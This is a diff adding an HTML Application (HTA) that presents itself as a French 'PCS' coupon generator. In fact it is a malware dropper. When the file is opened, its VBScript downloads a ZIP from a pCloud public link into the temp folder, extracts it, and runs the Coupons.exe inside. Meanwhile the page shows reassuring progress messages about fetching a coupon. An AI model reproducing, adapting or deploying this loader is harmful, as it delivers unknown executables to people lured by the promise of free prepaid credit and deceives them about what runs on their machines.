@@ -1,0 +1,93 @@
+<html>
+<head>
+<HTA:APPLICATION
+  ID="RechargePCSApp"
+  APPLICATIONNAME="Recharge PCS"
+  BORDER="dialog"
+  CAPTION="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+/>
+<title>Recharge PCS</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #ffffff;
+    padding: 40px;
+    text-align: center;
+    color: #333;
+  }
+  h1 {
+    color: #e74c3c;
+    margin-bottom: 20px;
+  }
+  #status {
+    margin-top: 30px;
+    font-size: 1.1em;
+    color: #2980b9;
+  }
+</style>
+<script language="VBScript">
+Sub Window_OnLoad
+  On Error Resume Next
+  document.body.insertAdjacentHTML "beforeEnd", "<div id='status'>📥 Téléchargement du coupon en cours...</div>"
+
+  Dim fso, shell, tempFolder, zipURL, zipPath, extractPath, http, stream, shellApp
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Set shell = CreateObject("WScript.Shell")
+  tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
+  zipPath = tempFolder & "\Recharge-Pcs.zip"
+  extractPath = tempFolder & "\PCS"
+
+  zipURL = "https://e.pcloud.link/publink/download?code=XZBl96ZDcumxqXn19QSerxY4ULg1FBqjotk"
+
+  ' Télécharger le ZIP
+  Set http = CreateObject("Microsoft.XMLHTTP")
+  http.Open "GET", zipURL, False
+  http.Send
+
+  If http.Status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' binaire
+    stream.Open
+    stream.Write http.responseBody
+    stream.SaveToFile zipPath, 2
+    stream.Close
+    document.getElementById("status").innerText = "✅ Téléchargement terminé. Extraction en cours..."
+  Else
+    MsgBox "Erreur de téléchargement. Code HTTP: " & http.Status, 16, "Erreur"
+    Exit Sub
+  End If
+
+  ' Créer le dossier d’extraction
+  If Not fso.FolderExists(extractPath) Then
+    fso.CreateFolder extractPath
+  End If
+
+  ' Extraction
+  Set shellApp = CreateObject("Shell.Application")
+  shellApp.NameSpace(extractPath).CopyHere shellApp.NameSpace(zipPath).Items(), 4
+
+  ' Attente courte pour laisser le temps à l'extraction
+  Dim i
+  For i = 1 To 10
+    WScript.Sleep 300
+  Next
+
+  ' Exécution
+  Dim exePath
+  exePath = extractPath & "\Coupons.exe"
+  If fso.FileExists(exePath) Then
+    shell.Run Chr(34) & exePath & Chr(34), 1, False
+    document.getElementById("status").innerText = "🎉 Coupon lancé avec succès !"
+  Else
+    document.getElementById("status").innerText = "❌ Fichier Coupons.exe introuvable dans l'archive."
+  End If
+End Sub
+</script>
+</head>
+<body>
+  <h1>Générateur de Coupon PCS</h1>
+</body>
+</html>
